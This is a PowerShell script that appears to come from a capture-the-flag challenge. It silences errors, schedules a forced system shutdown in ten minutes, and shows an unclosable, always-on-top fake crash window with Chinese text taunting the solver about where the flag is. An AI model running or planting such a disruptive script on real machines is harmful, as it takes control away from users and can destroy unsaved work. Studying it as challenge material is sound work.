$DebugPreference = $ErrorActionPreference = $VerbosePreference = $WarningPreference = "SilentlyContinue"

[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")

shutdown /s /t 600 >$Null 2>&1

$Form = New-Object System.Windows.Forms.Form
$Form.Text = "Ciallo～(∠·ω< )⌒★"
$Form.StartPosition = "Manual"
$Form.Location = New-Object System.Drawing.Point(40, 40)
$Form.Size = New-Object System.Drawing.Size(720, 480)
$Form.MinimalSize = New-Object System.Drawing.Size(720, 480)
$Form.MaximalSize = New-Object System.Drawing.Size(720, 480)
$Form.FormBorderStyle = "FixedDialog"
$Form.BackColor = "#0077CC"
$Form.MaximizeBox = $False
$Form.TopMost = $True


$fF1IA49G = "###_PLACEHOLDER_1_###"
$fF1IA49G = "N0pe"


$Label1 = New-Object System.Windows.Forms.Label
$Label1.Text = ":)"
$Label1.Location = New-Object System.Drawing.Point(64, 80)
$Label1.AutoSize = $True
$Label1.ForeColor = "White"
$Label1.Font = New-Object System.Drawing.Font("Consolas", 64)

$Label2 = New-Object System.Windows.Forms.Label
$Label2.Text = "这里没有 flag；这个窗口是怎么出现的呢，flag 就在那里"
$Label2.Location = New-Object System.Drawing.Point(64, 240)
$Label2.AutoSize = $True
$Label2.ForeColor = "White"
$Label2.Font = New-Object System.Drawing.Font("微软雅黑", 16)

$Label3 = New-Object System.Windows.Forms.Label
$Label3.Text = "你的电脑将在 10 分钟后关机，请保存你的工作"
$Label3.Location = New-Object System.Drawing.Point(64, 300)
$Label3.AutoSize = $True
$Label3.ForeColor = "White"
$Label3.Font = New-Object System.Drawing.Font("微软雅黑", 16)

$Form.Controls.AddRange(@($Label1, $Label2, $Label3))

$Form.Add_Shown({$Form.Activate()})
$Form.Add_FormClosing({
    $_.Cancel = $True
    [System.Windows.Forms.MessageBox]::Show("不允许关闭！", "提示", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
})

$Form.ShowDialog() | Out-Null
